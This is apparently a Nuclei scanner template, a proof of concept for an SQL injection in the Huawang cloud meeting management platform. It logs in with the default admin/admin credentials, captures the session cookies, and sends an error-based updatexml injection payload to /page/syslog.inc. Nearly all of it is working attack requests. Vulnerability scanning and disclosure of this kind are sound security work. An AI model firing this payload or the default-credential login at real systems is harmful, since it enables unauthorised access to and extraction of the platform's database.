id: poc-yaml-hwactive-syslog-inc-sqli
info:
  name: 华望云会议管理平台 syslog.inc SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli

variables:
  uid: ""
  cookie: ""

flow: http(1) && http(2)

http:
  - id: step-1
    method: POST
    path:
      - "{{BaseURL}}/ajax/userlogin"
    headers:
      Content-Type: "application/x-www-form-urlencoded; charset=UTF-8"
    body: "userNameCopy=admin&userName=admin&passWordCopy=admin&passWord=21232f297a57a5a743894a0e4a801fc3"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "\"success\":true"
    extractors:
      - type: regex
        name: uid
        part: header
        regex:
          - "uid=(.*?);"
        internal: true
      - type: regex
        name: cookie
        part: header
        regex:
          - "JSESSIONID=(.*?);"
        internal: true

  - id: step-2
    method: GET
    path:
      - "{{BaseURL}}/page/syslog.inc?search=1%25'+and+1%3d(updatexml(0x7e,concat(1,(select+md5(1))),1))+and+'%25%25'+like+'&params[]=displayName&params[]=module&params[]=act&params[]=ip&selectTime=1"
    headers:
      Cookie: "uid={{uid}}; JSESSIONID={{cookie}}"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        part: body
        words:
          - "XPATH syntax error"
          - "java.sql.SQLException"
          - "c4ca4238a0b923820dcc509a6f75849b"
